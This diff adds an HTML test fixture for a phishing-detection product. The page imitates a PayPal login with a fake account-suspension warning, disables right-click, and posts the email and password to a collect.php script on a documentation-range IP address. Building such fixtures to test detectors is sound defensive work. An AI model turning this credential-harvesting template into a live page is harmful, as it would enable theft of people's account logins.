@@ -1,0 +1,34 @@
+<!doctype html>
+<!-- TEST FIXTURE for Verano PhishGuard. Imitates a brand login page so the
+     page-content rules fire. The form posts to 198.51.100.7 (RFC 5737
+     documentation range, not routable), so nothing typed here goes anywhere. -->
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>Log in to your PayPal account</title>
+  <style>
+    body { font-family: Helvetica, Arial, sans-serif; background: #f5f7fa; margin: 0; }
+    .box { max-width: 380px; margin: 60px auto; background: #fff; padding: 32px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,.08); }
+    .logo { font-size: 28px; font-weight: 800; color: #1a3d7c; margin-bottom: 16px; }
+    .alert { background: #fff4e5; border: 1px solid #f0c36d; padding: 10px; border-radius: 6px; font-size: 14px; margin-bottom: 16px; }
+    input { width: 100%; padding: 12px; margin: 6px 0; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; font-size: 15px; }
+    button { width: 100%; padding: 12px; background: #1a3d7c; color: #fff; border: 0; border-radius: 20px; font-size: 16px; margin-top: 10px; }
+    footer { text-align: center; font-size: 12px; margin-top: 16px; }
+    footer a { color: #555; margin: 0 6px; }
+    .fixture { text-align: center; font-size: 11px; color: #999; margin-top: 30px; }
+  </style>
+</head>
+<body oncontextmenu="return false">
+  <div class="box">
+    <div class="logo" id="logo" aria-label="PayPal logo">PayPal</div>
+    <div class="alert">Your account has been limited. Please verify your identity within 24 hours to avoid permanent suspension.</div>
+    <form action="http://198.51.100.7/collect.php" method="post">
+      <input type="email" name="login_email" placeholder="Email or mobile number" autocomplete="off">
+      <input type="password" name="login_password" placeholder="Password">
+      <button type="submit">Log In</button>
+    </form>
+    <footer><a href="#">Help</a><a href="#">Privacy</a><a href="#">Legal</a><a href="#">Contact</a><a href="#">Sign Up</a></footer>
+  </div>
+  <p class="fixture">Verano PhishGuard test fixture, not a real login page.</p>
+</body>
+</html>
